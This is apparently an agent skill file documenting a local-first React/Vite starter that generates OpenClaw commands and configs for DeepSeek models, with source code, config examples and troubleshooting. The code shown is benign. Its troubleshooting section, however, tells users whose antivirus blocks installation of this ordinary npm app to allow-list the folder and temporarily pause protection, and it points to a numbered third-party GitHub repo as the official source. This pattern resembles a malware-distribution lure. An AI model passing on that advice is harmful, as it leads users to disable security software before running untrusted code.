---
name: deepseek-openclaw-integration
description: Build and configure OpenClaw integrations with DeepSeek AI models using this local-first web app starter
triggers:
  - how do I connect DeepSeek to OpenClaw
  - set up DeepSeek with OpenClaw
  - configure DeepSeek models in OpenClaw
  - generate OpenClaw onboarding command for DeepSeek
  - create OpenClaw config for DeepSeek API
  - which DeepSeek models work with OpenClaw
  - troubleshoot DeepSeek OpenClaw integration
  - show me DeepSeek OpenClaw configuration examples
---

# DeepSeek OpenClaw Integration Skill

> Skill by [ara.so](https://ara.so) — Hermes Skills collection.

DeepSeek OpenClaw is a local-first web application that helps developers configure DeepSeek AI models with OpenClaw, an agent framework. The app generates OpenClaw onboarding commands and configuration snippets without sending API keys to any backend, ensuring secure local credential management.

## Installation

### Quick Start

```bash
git clone https://github.com/MageExemplify/deepseek-openclaw-648.git
cd deepseek-openclaw-648
npm install
npm start
```

### Development Mode

```bash
npm run dev
```

### Production Build

```bash
npm run build
npm run preview
```

## Project Architecture

The application is built with:

- **Vite** — Fast build tool and dev server
- **React** — UI framework
- **TypeScript** — Type safety
- **Local-first architecture** — No backend, all processing in browser

### Key Source Files

- `src/App.tsx` — Main application component
- `src/models.ts` — DeepSeek model catalog
- `src/openclaw.ts` — OpenClaw command/config generation logic
- `src/types.ts` — TypeScript definitions
- `src/styles.css` — Styling

## DeepSeek Models for OpenClaw

The starter includes references to these DeepSeek models:

| Model ID | Use Case |
|----------|----------|
| `deepseek/deepseek-v4-flash` | Fast everyday automation (default) |
| `deepseek/deepseek-v4-pro` | Complex coding and planning tasks |
| `deepseek/deepseek-chat` | General conversational chat |
| `deepseek/deepseek-reasoner` | Reasoning-focused sessions |

## Model Configuration (models.ts)

```typescript
// src/models.ts
export interface DeepSeekModel {
  id: string;
  name: string;
  description: string;
  useCase: string;
  recommended?: boolean;
}

export const deepseekModels: DeepSeekModel[] = [
  {
    id: "deepseek/deepseek-v4-flash",
    name: "DeepSeek V4 Flash",
    description: "Fast, efficient model for everyday tasks",
    useCase: "Default fast path for everyday automation",
    recommended: true
  },
  {
    id: "deepseek/deepseek-v4-pro",
    name: "DeepSeek V4 Pro",
    description: "More powerful model for complex reasoning",
    useCase: "Stronger model for complex coding and planning"
  },
  {
    id: "deepseek/deepseek-chat",
    name: "DeepSeek Chat",
    description: "General-purpose chat model",
    useCase: "General non-thinking chat surface"
  },
  {
    id: "deepseek/deepseek-reasoner",
    name: "DeepSeek Reasoner",
    description: "Specialized reasoning model",
    useCase: "Reasoning-focused sessions"
  }
];
```

## OpenClaw Command Generation (openclaw.ts)

```typescript
// src/openclaw.ts
export interface OpenClawConfig {
  model: string;
  apiKey: string;
}

export function generateOnboardingCommand(config: OpenClawConfig): string {
  const keyValue = config.apiKey 
    ? config.apiKey 
    : "${DEEPSEEK_API_KEY}";
  
  return `openclaw init --provider deepseek --model ${config.model} --api-key ${keyValue}`;
}

export function generateConfigSnippet(config: OpenClawConfig): string {
  const redactedKey = config.apiKey 
    ? "sk-***redacted***" 
    : "${DEEPSEEK_API_KEY}";
  
  return JSON.stringify({
    env: {
      DEEPSEEK_API_KEY: redactedKey
    },
    agents: {
      defaults: {
        model: {
          primary: config.model
        }
      }
    }
  }, null, 2);
}
```

## App Component Example (App.tsx)

```typescript
// src/App.tsx
import React, { useState } from 'react';
import { deepseekModels } from './models';
import { generateOnboardingCommand, generateConfigSnippet } from './openclaw';
import './styles.css';

export default function App() {
  const [selectedModel, setSelectedModel] = useState(deepseekModels[0].id);
  const [apiKey, setApiKey] = useState('');

  const command = generateOnboardingCommand({ 
    model: selectedModel, 
    apiKey 
  });
  
  const configSnippet = generateConfigSnippet({ 
    model: selectedModel, 
    apiKey 
  });

  return (
    <div className="app">
      <header>
        <h1>DeepSeek OpenClaw</h1>
        <p>Configure DeepSeek models for OpenClaw locally</p>
      </header>

      <section className="model-selector">
        <h2>Select DeepSeek Model</h2>
        {deepseekModels.map(model => (
          <label key={model.id}>
            <input
              type="radio"
              name="model"
              value={model.id}
              checked={selectedModel === model.id}
              onChange={(e) => setSelectedModel(e.target.value)}
            />
            <div>
              <strong>{model.name}</strong>
              {model.recommended && <span className="badge">Recommended</span>}
              <p>{model.description}</p>
            </div>
          </label>
        ))}
      </section>

      <section className="api-key-input">
        <h2>DeepSeek API Key (Optional)</h2>
        <input
          type="password"
          placeholder="Leave empty to use $DEEPSEEK_API_KEY"
          value={apiKey}
          onChange={(e) => setApiKey(e.target.value)}
        />
      </section>

      <section className="output">
        <h2>Onboarding Command</h2>
        <pre><code>{command}</code></pre>
        <button onClick={() => navigator.clipboard.writeText(command)}>
          Copy Command
        </button>
      </section>

      <section className="output">
        <h2>OpenClaw Config Snippet</h2>
        <pre><code>{configSnippet}</code></pre>
        <button onClick={() => navigator.clipboard.writeText(configSnippet)}>
          Copy Config
        </button>
      </section>
    </div>
  );
}
```

## Environment Variables

Create `.env` in project root:

```bash
# .env
DEEPSEEK_API_KEY=your_api_key_here
```

**Never commit `.env` files.** Use `.env.example` as a template:

```bash
# .env.example
DEEPSEEK_API_KEY=sk-your-key-here
```

## OpenClaw Configuration Patterns

### Basic Agent Configuration

```json
{
  "env": {
    "DEEPSEEK_API_KEY": "${DEEPSEEK_API_KEY}"
  },
  "agents": {
    "defaults": {
      "model": {
        "primary": "deepseek/deepseek-v4-flash"
      }
    }
  }
}
```

### Multi-Model Configuration

```json
{
  "env": {
    "DEEPSEEK_API_KEY": "${DEEPSEEK_API_KEY}"
  },
  "agents": {
    "fast-agent": {
      "model": {
        "primary": "deepseek/deepseek-v4-flash"
      }
    },
    "reasoning-agent": {
      "model": {
        "primary": "deepseek/deepseek-reasoner"
      }
    },
    "pro-agent": {
      "model": {
        "primary": "deepseek/deepseek-v4-pro"
      }
    }
  }
}
```

### Channel-Specific Configuration

```json
{
  "env": {
    "DEEPSEEK_API_KEY": "${DEEPSEEK_API_KEY}"
  },
  "agents": {
    "defaults": {
      "model": {
        "primary": "deepseek/deepseek-v4-flash"
      },
      "channels": {
        "slack": {
          "enabled": true,
          "allowlist": ["C01234567"]
        }
      }
    }
  }
}
```

## OpenClaw CLI Commands

### Initialize with DeepSeek

```bash
# Using environment variable
export DEEPSEEK_API_KEY=sk-your-key-here
openclaw init --provider deepseek --model deepseek/deepseek-v4-flash

# Using inline API key (not recommended for production)
openclaw init --provider deepseek --model deepseek/deepseek-v4-flash --api-key sk-your-key-here
```

### Test Connection

```bash
openclaw test-connection --provider deepseek
```

### List Available Models

```bash
openclaw models list --provider deepseek
```

### Update Agent Configuration

```bash
openclaw config set agents.defaults.model.primary deepseek/deepseek-v4-pro
```

## TypeScript Types

```typescript
// src/types.ts
export interface OpenClawConfig {
  env: {
    DEEPSEEK_API_KEY: string;
  };
  agents: {
    [agentName: string]: AgentConfig;
  };
}

export interface AgentConfig {
  model: {
    primary: string;
    fallback?: string;
  };
  channels?: {
    [channelType: string]: ChannelConfig;
  };
}

export interface ChannelConfig {
  enabled: boolean;
  allowlist?: string[];
  mentionRules?: string[];
}

export interface DeepSeekModel {
  id: string;
  name: string;
  description: string;
  useCase: string;
  recommended?: boolean;
}
```

## Security Best Practices

### API Key Management

**DO:**
- Store API keys in environment variables
- Use OpenClaw auth profiles for production
- Use secret management services (AWS Secrets Manager, Vault)
- Redact keys in logs and screenshots
- Use `.gitignore` to exclude `.env` files

**DON'T:**
- Commit API keys to version control
- Hardcode keys in source files
- Share keys in screenshots or documentation
- Use production keys in development

### OpenClaw Channel Security

```json
{
  "agents": {
    "defaults": {
      "channels": {
        "slack": {
          "enabled": true,
          "allowlist": ["C01234567", "C89012345"],
          "mentionRules": ["@assistant", "hey bot"]
        }
      }
    }
  }
}
```

## Troubleshooting

### API Key Not Recognized

**Problem:** OpenClaw can't authenticate with DeepSeek.

**Solution:**
```bash
# Verify environment variable is set
echo $DEEPSEEK_API_KEY

# Re-export if needed
export DEEPSEEK_API_KEY=sk-your-key-here

# Test connection
openclaw test-connection --provider deepseek
```

### Model Not Available

**Problem:** Selected model returns 404 or unsupported error.

**Solution:**
```bash
# List currently available models
openclaw models list --provider deepseek

# Update to available model
openclaw config set agents.defaults.model.primary deepseek/deepseek-chat
```

### Build Fails with Vite Errors

**Problem:** `npm run build` fails with module resolution errors.

**Solution:**
```bash
# Clear node_modules and lock file
rm -rf node_modules package-lock.json

# Reinstall dependencies
npm install

# Clear Vite cache
rm -rf node_modules/.vite

# Rebuild
npm run build
```

### Security Software Blocks Installation

**Problem:** Windows Defender or antivirus blocks installation.

**Solution:**
- Add project folder to allowed list
- Temporarily pause protection during install
- Only download from official GitHub repository: `https://github.com/MageExemplify/deepseek-openclaw-648`

### TypeScript Type Errors

**Problem:** TypeScript compilation errors in development.

**Solution:**
```bash
# Check TypeScript configuration
cat tsconfig.json

# Verify types are installed
npm install --save-dev @types/react @types/react-dom

# Run type check
npx tsc --noEmit
```

## Common Workflows

### Add New Model to Catalog

```typescript
// src/models.ts
export const deepseekModels: DeepSeekModel[] = [
  // ... existing models
  {
    id: "deepseek/deepseek-v5-turbo",
    name: "DeepSeek V5 Turbo",
    description: "Next-generation turbo model",
    useCase: "Ultra-fast responses with improved accuracy",
    recommended: false
  }
];
```

### Create Custom Config Generator

```typescript
// src/customConfig.ts
import { OpenClawConfig } from './types';

export function generateProductionConfig(
  model: string,
  channels: string[]
): OpenClawConfig {
  return {
    env: {
      DEEPSEEK_API_KEY: "${DEEPSEEK_API_KEY}"
    },
    agents: {
      production: {
        model: {
          primary: model,
          fallback: "deepseek/deepseek-chat"
        },
        channels: channels.reduce((acc, channel) => ({
          ...acc,
          [channel]: { enabled: true }
        }), {})
      }
    }
  };
}
```

### Add Copy-to-Clipboard Utility

```typescript
// src/utils.ts
export async function copyToClipboard(text: string): Promise<boolean> {
  try {
    await navigator.clipboard.writeText(text);
    return true;
  } catch (err) {
    console.error('Failed to copy:', err);
    return false;
  }
}

// Usage in component
import { copyToClipboard } from './utils';

const handleCopy = async () => {
  const success = await copyToClipboard(command);
  if (success) {
    alert('Copied to clipboard!');
  }
};
```

## References

- **OpenClaw Documentation:** https://docs.openclaw.ai/
- **OpenClaw DeepSeek Provider:** https://docs.openclaw.ai/providers/deepseek
- **DeepSeek API Documentation:** https://api-docs.deepseek.com/
- **DeepSeek OpenClaw Integration:** https://api-docs.deepseek.com/quick_start/agent_integrations/openclaw
